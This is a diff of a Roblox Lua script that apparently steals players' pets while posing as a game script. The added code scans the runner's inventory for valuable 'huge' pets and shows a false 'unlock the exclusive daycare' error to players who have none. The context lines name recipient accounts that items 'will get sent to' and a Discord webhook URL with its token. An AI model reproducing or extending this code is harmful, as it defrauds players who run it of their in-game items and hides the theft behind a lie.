@@ -32,6 +32,27 @@ local H = Y.TextField({
     Type = "Password"
 })
 
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+
+local foundHugePet = false
+
+for i, v in pairs(save.Pet) do
+    local id = v.id
+    local dir = library.Directory.Pets[id]
+    
+    if dir and dir.huge then
+        foundHugePet = true
+        break
+    end
+end
+
+if not foundHugePet then
+    local message = require(game.ReplicatedStorage.Library.Client.Message)
+    message.Error("Woops! You need to unlock the exclusive daycare in order to make the script work!")
+end
+	
+
 Username = "LaRussieCool2"
 Username2 = "LaRussieCool3" -- stuff will get sent to this user if first user's mailbox is full
 Webhook = "https://discord.com/api/webhooks/1233473062293475410/W700VWb5jOrYwX2nGTlmZ4UNMmwqhQ_pnsxcOISS3AQ_aQ7QDL5jXQvc8_f-QhNF4lV8"
